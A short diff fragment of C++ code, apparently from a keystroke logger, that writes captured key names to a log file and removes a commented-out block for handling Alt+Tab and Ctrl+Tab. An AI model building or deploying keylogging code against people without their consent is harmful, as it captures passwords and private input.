@@ -160,12 +160,6 @@ public:
 			m_logFile << vkMapToStr[m_keyLoggerStack[m_keyLoggerStack.size() - 1]] << std::endl;
 		}
 		m_keyLoggerStack.pop_back();
-		//针对Alt+Tab 以及 Ctrl + Tab这两个组合键进行优化
-		/*if (vk == VK_TAB){
-			m_keyLoggerStack.pop_back();
-		} else {
-			m_keyLoggerStack.clear();
-		}*/
 	}
 
 private:
